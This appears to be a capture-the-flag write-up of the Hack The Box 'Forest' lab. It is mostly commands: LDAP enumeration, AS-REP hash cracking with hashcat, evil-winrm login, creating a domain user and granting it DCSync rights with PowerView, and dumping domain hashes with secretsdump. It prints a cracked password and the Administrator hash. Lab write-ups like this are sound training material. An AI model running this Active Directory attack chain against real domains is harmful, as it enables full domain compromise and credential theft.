---
title: "HTB - Forest"
date: 2026-02-10
platform: "HTB"
difficulty: "Easy"
tags: ["Active Directory", "LDAP", "Kerberoasting", "DCSync"]
summary: "LDAP enumeration and Kerberoasting against a Windows Server domain controller, leading to DCSync and full domain compromise."
---

IP :  10.129.16.182

# Enumeration

## Port scanning

![[1.png]]

LDAP enumeration  using LDAPsearch
![[2.png]]
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Users,DC=htb,DC=local"
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Computers,DC=htb,DC=local"
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Domain Admins,CN=Users,DC=htb,DC=local"
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Domain Users,CN=Users,DC=htb,DC=local"
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Enterprise Admins,CN=Users,DC=htb,DC=local"
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Administrators,CN=Builtin,DC=htb,DC=local"
ldapsearch -x -H ldap://10.129.16.182 -b "CN=Remote Desktop Users,CN=Builtin,DC=htb,DC=local"


Best and rapid LDAP enumeration using https://github.com/ropnop/windapsearch.git

![[3.png]]
![[4.png]]
![[5.png]]

We found uncommon service account : ==CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local== This service requires that Kerberos pre-authentication be disabled in order to function.

![[6.png]]
Got the ash via ASREPRoasting
hashcat -m 18200 hash.hash /usr/share/wordlists/rockyou.txt --force
User : svc-alfresco
password : s3rvice

using 
evil-winrm -i 10.129.16.182 -u svc-alfresco -p s3rvice (port 5985)

==Exchange Windows Permissions possède WriteDACL sur le domaine, ce qui permet — via Account Operators — d'y ajouter un user et de lui accorder des droits DCSync pour dumper les hashes AD.==

net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add

next  we use powerview 

$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

We use john's credentials (added to Exchange Windows Permissions) to grant ourselves DCSync rights via PowerView, which then allows us to dump all domain hashes.

impacket-secretsdump htb/john@10.129.16.204


got the hash : htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

